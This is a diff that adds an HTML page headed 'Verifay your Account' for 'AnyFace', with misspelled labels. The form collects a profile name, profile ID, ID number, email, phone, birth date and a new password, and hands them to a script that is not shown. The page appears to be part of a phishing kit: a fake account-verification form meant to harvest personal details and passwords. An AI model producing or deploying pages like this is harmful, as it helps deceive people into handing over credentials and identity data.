@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="shortcut icon" href="/icon.png" type="image/x-icon" />
+    <link rel="stylesheet" href="/style/style.main.css" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AnyFace Verifay Account</title>
+  </head>
+  <body>
+    <section class="maincontect">
+      <div class="melo">
+        <div class="vcc" id="checkontheviy">
+          <blockquote>
+            <h2 style="color: #4680ff;">You alrady Verifayed! </h2>
+          </blockquote>
+        </div>
+        <form
+          onsubmit="verifaydata()"
+          action=""
+          method="POST"
+          enctype="multipart/form-data"
+          id="mainfrom"
+        >
+          <blockquote>
+            <h2>Verifay your Account</h2>
+            <label for="username">Profile Name<n>*</n></label>
+            <input
+              name="username"
+              type="text"
+              id="profilename"
+              placeholder="load The Server"
+              required
+              
+            />
+            <label for="userimg">Profile ID <n>*</n></label>
+            <input
+              type="text"
+              name="userimg"
+              id="profileimg"
+              placeholder="load The Server"
+              required
+            />
+            <label for="uid">ID NO <n>*</n></label>
+            <input
+              type="text"
+              name="id"
+              id="uid"
+              placeholder="load The Server"
+              required
+            />
+            <label for="email">Email <n>*</n></label>
+            <input
+              type="text"
+              name="useremail"
+              id="profileemail"
+              placeholder="Input Your Email"
+              required
+            />
+            <label for="phone">Phone <n>*</n></label>
+            <input
+              type="text"
+              name="userphone"
+              id="profilephone"
+              placeholder="Input you Phone Number"
+              required
+            />
+            <label for="userimg">Bath Of Date <n>*</n></label>
+            <input
+              type="date"
+              name="userbath"
+              id="userbath"
+              placeholder="input Date"
+              required
+            />
+            <label for="userimg">Set A Password <n>*</n></label>
+            <input
+              type="password"
+              name="userimg"
+              id="password"
+              placeholder="load The Server"
+              required
+            />
+            <button>Get Verifay</button>
+          </blockquote>
+        </form>
+      </div>
+    </section>
+    <script src="/javascript/verifay.js"></script>
+  </body>
+</html>
